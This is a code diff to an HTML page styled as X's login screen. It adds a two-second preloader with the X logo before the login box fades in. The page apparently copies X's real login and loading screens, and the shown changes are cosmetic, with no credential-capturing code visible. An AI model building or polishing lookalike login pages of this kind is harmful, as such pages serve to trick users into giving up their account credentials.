@@ -120,6 +120,21 @@
         }
         .dot { margin: 0 2px; color: #71767b; }
         
+        #preloader {
+            position: fixed;
+            ...
+            z-index: 10000; 
+            transition: opacity 0s ease-out; 
+        }
+        #preloader .logo {
+            width: 60px; 
+        }
+        
+        .container {
+            opacity: 0; 
+            transition: opacity 0s ease-in; 
+        }
+        
         @media (max-width: 600px) {
             .container { justify-content: flex-start; padding-top: 40px; }
             h1 { font-size: 26px; }
@@ -128,10 +143,11 @@
     </style>
 </head>
 <body>
-
+    <div id="preloader">
+        <svg viewBox="0 0 24 24" class="logo" aria-label="X">...</svg>
+    </div>
 <div class="container">
     <div class="login-box">
-        <!-- Xロゴ -->
         <svg viewBox="0 0 24 24" class="logo" aria-label="X"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
 
         <h1>Xにログイン</h1>
@@ -194,6 +210,21 @@
             window.location.href = 'https://x.com/i/flow/signup';
         });
     }
+    
+window.addEventListener('load', function() {
+    const preloader = document.getElementById('preloader');
+    const container = document.querySelector('.container');
+
+    setTimeout(function() {
+        preloader.style.opacity = '0';
+        container.style.opacity = '1';
+        
+        setTimeout(function() {
+            preloader.style.display = 'none';
+        }, 1000); 
+
+    }, 2000); 
+});
 </script>
 </body>
 </html>
